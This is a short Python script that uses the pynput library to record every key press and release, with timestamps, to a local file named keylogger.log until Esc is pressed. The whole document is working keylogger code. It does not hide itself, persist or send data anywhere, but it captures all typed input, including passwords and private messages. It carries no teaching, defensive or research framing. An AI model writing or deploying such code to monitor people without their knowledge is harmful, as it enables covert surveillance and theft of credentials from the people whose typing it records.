from pynput import keyboard
import logging

# Configure logging
logging.basicConfig(filename="keylogger.log", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the key press
        logging.info(f'Key {key} pressed')
    except Exception as e:
        # Handle any errors that occur
        logging.error(f'Error logging key press: {e}')

def on_release(key):
    try:
        # Log the key release
        logging.info(f'Key {key} released')
    except Exception as e:
        # Handle any errors that occur
        logging.error(f'Error logging key release: {e}')

    # Stop listener if the 'esc' key is pressed
    if key == keyboard.Key.esc:
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()